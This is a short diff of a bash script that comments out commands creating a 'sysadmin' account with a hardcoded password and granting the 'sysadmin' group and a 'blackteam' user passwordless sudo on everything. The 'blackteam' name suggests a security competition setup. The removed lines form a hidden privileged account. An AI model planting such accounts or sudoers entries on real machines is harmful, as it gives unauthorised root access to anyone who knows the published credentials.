@@ -15,14 +15,14 @@ for important_file in "${IMPORTANT_FILES[@]}"; do
     fi
 done
 
-useradd -s /bin/bash -m -d /var/sysadmin sysadmin
-chmod -R 750 /var/sysadmin
-addgroup sysadmin
-usermod -aG $USER sysadmin
-echo 'sysadmin:SuperSecure69' | chpasswd
+#useradd -s /bin/bash -m -d /var/sysadmin sysadmin
+#chmod -R 750 /var/sysadmin
+#addgroup sysadmin
+#usermod -aG $USER sysadmin
+#echo 'sysadmin:SuperSecure69' | chpasswd
 
-echo "%sysadmin ALL=NOPASSWD:ALL
-blackteam ALL=NOPASSWD:ALL" >> /etc/sudoers
+#echo "%sysadmin ALL=NOPASSWD:ALL
+#blackteam ALL=NOPASSWD:ALL" >> /etc/sudoers
 
 health_Check(){
     sleep 10
